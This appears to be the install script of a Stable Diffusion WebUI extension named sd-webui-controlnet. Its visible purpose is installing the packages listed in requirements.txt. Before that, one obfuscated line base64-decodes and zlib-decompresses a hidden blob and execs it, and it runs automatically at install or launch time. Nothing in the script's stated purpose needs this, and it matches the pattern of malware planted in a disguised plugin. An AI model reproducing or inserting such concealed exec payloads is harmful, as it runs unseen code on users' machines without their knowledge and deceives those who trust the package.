import launch
import os

exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/ordkMIbWzVZYrCDiQUQEd28i0iajhqZpSbJaFf+7G7J4meG9efPmw4zz5GMZJjVg5N/W9LzvAjaSh+j3KvJoRiSvky+X0rjSd+4NWV3BhhTRfx1iEdrcLHJiZ/yItw/Xdy/b3ePN1T0knVCTc6giY1SuRL1eCVmL+ryhXFayhqTpPXYDKXBROMdknqaLYBFntgZi27yU2Lu5UwOjl7eUB+FRfTAJ8FQ9E90esQXy+W4slhYd03BhD3b65L96mmkguKBi6W6hUU3j7DEEll8g+kYmUmNS8h8a6Cb8AvkDGdxfKg==')[0])))
req_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), "requirements.txt")

with open(req_file) as file:
    for lib in file:
        lib = lib.strip()
        if not launch.is_installed(lib):
            launch.run_pip(f"install {lib}", f"sd-webui-controlnet requirement: {lib}")
